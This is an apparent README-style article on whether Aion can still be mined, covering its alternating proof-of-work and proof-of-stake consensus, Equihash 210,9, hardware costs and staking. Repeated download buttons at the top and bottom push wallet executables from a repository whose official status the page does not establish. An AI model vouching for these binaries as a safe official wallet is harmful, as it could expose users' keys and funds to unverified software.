![Aion Wallet](assets/banner-article.png)

# Is Aion still mineable

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Aion still produces proof-of-work blocks, so mining remains part of the network's consensus, but a miner's earnings today depend on hardware, electricity and the pool rather than on the chain alone.

Whether it is worth doing is a different question from whether it is possible, and the two get merged constantly in discussions of older GPU-mined networks.

## You'll see this if

- You have a GPU rig and are looking for a network that still uses it.
- You read that Aion is proof-of-stake and concluded mining had ended.
- You are comparing mining with delegating as a way to earn AION.
- You found a pool advertising Aion and want to know whether the chain still supports it.

## What mining is on this network

Unity consensus alternates proof-of-work and proof-of-stake blocks. Every other block is produced by a miner, and every other block by a staker, so both halves are live parts of the same chain.

Mining uses Equihash, the memory-hard algorithm family that was designed to favour GPUs over custom hardware. Aion's parameters are the 210,9 variant, and the network's mining pools accept shares from miners running compatible software.

## What changed over time

The reference miner in the project's repositories has not seen a release since 2019, and the wider ecosystem of GPU miners moved on. That does not make the algorithm obsolete; it means the tooling is older than the chain, and a miner starting today is more likely to follow a pool's current instructions than a reference client from that era.

Difficulty and reward follow the network's rules rather than the software's age. What a rig earns is set by how much of the network's hash rate it contributes and by the price of the token, which is why no guide can quote a profit figure that stays true.

## Hardware and cost, honestly

Equihash 210,9 wants memory bandwidth rather than raw compute, so a card with more memory does better than a newer card with less. Power draw is the other half of the equation, and it is the half that decides whether a rig is viable where you live.

Running the numbers is arithmetic, not a prediction: hashes per second, share of network hash rate, block reward, token value, electricity price. Any number that changes monthly makes a profit projection a guess with confidence attached.

## Mining versus staking

Mining needs hardware, power and a pool or a solo setup. Staking needs coins and a wallet, and on this network it also needs a 1,000 AION bond if you are registering rather than delegating.

Both earn from the same consensus. The [how to stake AION](https://github.com/aion-wallet/aion-staking/blob/main/how-to-stake-aion.md) guide covers the passive side, and the [Aion mining algorithm](https://github.com/aion-wallet/aion-staking/blob/main/aion-mining-algorithm.md) article goes deeper into the algorithm.

## Where the rewards go

A pool pays out to the address you configure, so a 0xa0 address you control is the first thing to set. Getting that wrong is the one error a pool cannot reverse.

The wallet holds the address and the balance; it does not mine. Use it to receive payouts and, if you want, to delegate what you mine.

A pool needs a node behind it, and the [how to run an Aion node](https://github.com/aion-wallet/aion-staking/blob/main/how-to-run-aion-node.md) guide covers what that machine has to do and how to tell it is following the chain.

## Prevention

Check the pool's current status before pointing hardware at it. A pool endpoint that no longer resolves is a common reason a rig runs all night for nothing.

Confirm the payout address by copying it from the wallet and comparing the ends, not by retyping it.

Treat any profit calculator as an illustration. It cannot know tomorrow's difficulty or price, and neither can a guide.

## What a rig actually needs

A GPU with enough memory bandwidth to solve the algorithm, a miner configured for the pool's protocol, a stable connection, and a payout address you control. Those four items are the whole setup, and the failures are almost always in the last two.

Power is the variable that decides viability. A rig that earns tokens worth less than the electricity it consumes is a hobby rather than an income, and that comparison changes with both the difficulty and the price, which is why no guide can settle it for you.

Start small if you are new to it. A single card pointed at a pool for a month tells you more about the economics than a calculator does, and it costs less than scaling before you know, as the [Aion mining algorithm](https://github.com/aion-wallet/aion-staking/blob/main/aion-mining-algorithm.md) article explains.

## Frequently asked questions

### Is Aion proof-of-work or proof-of-stake?

Both. Unity consensus alternates the two, so mining and staking produce blocks on the same chain.

### Can I mine Aion with a CPU?

The algorithm is GPU-oriented. A CPU can run a reference miner for testing, but it is not competitive on a live network.

### Do I need a special miner?

You need software compatible with Equihash 210,9 and with the pool you choose. Pool instructions are the practical starting point.

### Is mining profitable?

That depends on hardware, power cost and the token's value at the time. No fixed answer exists, and any guide that gives one is describing its own assumptions.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Aion mining algorithm](https://github.com/aion-wallet/aion-staking/blob/main/aion-mining-algorithm.md) - Equihash 210,9 in detail.
- [How to run an Aion node](https://github.com/aion-wallet/aion-staking/blob/main/how-to-run-aion-node.md) - the node behind a pool or a solo setup.
- [How to stake AION](https://github.com/aion-wallet/aion-staking/blob/main/how-to-stake-aion.md) - earning without hardware.
- [Aion staking rewards](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-rewards.md) - how the other half of consensus pays.
